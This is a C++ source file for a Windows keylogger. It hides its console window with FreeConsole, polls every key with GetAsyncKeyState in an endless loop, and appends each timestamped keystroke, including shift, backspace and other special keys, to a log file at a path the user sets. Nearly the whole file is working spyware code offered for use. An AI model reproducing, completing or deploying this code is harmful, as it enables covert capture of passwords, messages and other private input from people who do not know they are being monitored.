#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <ctime>
#include <ctype.h>
using namespace std;
const char *path = "";                      //Here put the path you want to save the keys

void Save(int key){
  Sleep(10);
  if(key == 16 || key == 161 || key == 160 || key == 10 || key == 37 || key == 38 || key == 39 || key ==40 || key == 162 )                    //this doesnot save shift, undefined vaule
    return;
  FILE *f;
  time_t now = time(0);                               //take time in time_t
  char *p = ctime(&now);                              //take date as a char array
  string str = p;                                     //convert char to string
  str.erase(str.end()-1, str.end());                  //remove \n from date's default format
  strcpy(p, str.c_str());                             //string to char
  f = fopen(path, "a+");                              //open the file to store the key
  fprintf(f, "%s: ", p);                              //store the date
  if(GetKeyState(161) == -127 || GetKeyState(161) == -128 || GetKeyState(160) == -127 || GetKeyState(160) == -128 || GetKeyState(10) == -127 || GetKeyState(10) == -128){       //this checks if shift is pressed together with another key
    if(key != 161 && key != 160 && key != 10){
      fprintf(f, "%s", "[SHIFT] + ");
    }
  }
  if (key == VK_BACK)                                               //translation of key
    fprintf(f, "%s\n", "[BACKSPACE]");
  else if (key == VK_LBUTTON)
    fprintf(f, "%s\n", "[LBUTTON]");
  else if (key == VK_RETURN)
    fprintf(f, "%s\n", "[RETURN]");
  else if (key == VK_CAPITAL)
    fprintf(f, "%s\n", "[CAPS_LOCK]");
  else if (key == VK_ESCAPE)
    fprintf(f, "%s\n", "[ESCAPE]");
  else if (key == VK_SPACE)
    fprintf(f, "%s\n", "[SPACE]");
  else if (key == VK_MENU)
    fprintf(f, "%s\n", "[ALT]");
  else if (key == VK_CONTROL)
    fprintf(f, "%s\n", "[CONTROL]");
  else if (key == VK_NUMPAD0)
    fprintf(f, "%s\n", "0");
  else if (key == VK_NUMPAD1)
    fprintf(f, "%s\n", "1");
  else if (key == VK_NUMPAD2)
    fprintf(f, "%s\n", "2");
  else if (key == VK_NUMPAD3)
    fprintf(f, "%s\n", "3");
  else if (key == VK_NUMPAD4)
    fprintf(f, "%s\n", "4");
  else if (key == VK_NUMPAD5)
    fprintf(f, "%s\n", "5");
  else if (key == VK_NUMPAD6)
    fprintf(f, "%s\n", "6");
  else if (key == VK_NUMPAD7)
    fprintf(f, "%s\n", "7");
  else if (key == VK_NUMPAD8)
    fprintf(f, "%s\n", "8");
  else if (key == VK_NUMPAD9)
    fprintf(f, "%s\n", "9");
  else if (key == VK_TAB)
    fprintf(f, "%s\n", "[TAB]");
  else if (key == VK_NUMLOCK)
    fprintf(f, "%s\n", "[NUMLOCK]");
  else if (key == 187)
    fprintf(f, "%s\n", "+");
  else if (key == 186)
    fprintf(f, "%s\n", ";");
  else if (key == 188)
    fprintf(f, "%s\n", ",");
  else if (key == 191)
    fprintf(f, "%s\n", "/?");
  else if(key>=48 && key<=57)
    fprintf(f, "%s\n", &key);
  else{
    if(GetKeyState(20) == 1){                                 //caps lock active == capital letters
      fprintf(f, "%s\n", &key);
    }
    else{
      key+=32;
      fprintf(f, "%s\n", &(key));                             //caps lock inactive == lower letters
    }
  }
  fclose(f);                                                      //close the file
}

int main(){
  FreeConsole();                                              //hides cmd while program is running
  int i;
  while(true){
    Sleep(10);
    for(i = 8; i <= 255; i++){
      if(GetAsyncKeyState(i) == -32767){                          //checks if the key i was presses since last call of GetAsyncKeyState()
        Save(i);                                                    //saves key
      }
    }
  }
  return 0;
}
